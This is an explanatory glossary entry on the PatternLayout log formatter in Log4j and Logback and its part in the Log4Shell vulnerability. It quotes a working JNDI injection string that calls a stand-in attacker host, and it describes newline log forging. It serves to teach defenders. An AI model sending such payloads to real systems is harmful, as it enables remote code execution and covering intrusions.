# PatternLayout

## What it is
Like a Mad Libs template for log messages, PatternLayout is a configurable formatting engine used in logging frameworks (Apache Log4j, Logback) that controls how log entries are structured using conversion specifiers (e.g., `%d` for date, `%m` for message, `%c` for class name). It defines the exact shape of every log line written to files, consoles, or remote systems.

## Why it matters
PatternLayout sits at the center of the Log4Shell (CVE-2021-44228) catastrophe. Log4j's PatternLayout processed user-supplied strings through its message lookup feature, meaning an attacker who injected `${jndi:ldap://attacker.com/x}` into a logged field (like a User-Agent header) triggered an outbound LDAP call and remote code execution — simply because the logging framework tried to *render* the pattern. Understanding PatternLayout explains *why* logging untrusted input without sanitization is catastrophically dangerous.

## Key facts
- PatternLayout is the default formatter in Log4j 1.x/2.x and Logback; its conversion patterns directly control what gets evaluated at log time
- Log4j 2.x introduced **message lookups** (`${...}` syntax) that PatternLayout evaluates, enabling the JNDI injection vector in Log4Shell
- The fix for Log4Shell included setting `log4j2.formatMsgNoLookups=true` to prevent PatternLayout from resolving lookups inside log messages
- Misconfigured PatternLayouts can also cause **log injection** attacks — inserting newline characters (`%0a`) to forge fake log entries and obscure attacker activity
- Defenders use PatternLayout configuration to enforce **structured logging** (JSON format), making SIEM ingestion and alerting more reliable and tamper-evident

## Related concepts
[[Log4Shell CVE-2021-44228]] [[JNDI Injection]] [[Log Injection]] [[SIEM Log Ingestion]] [[Input Validation]]
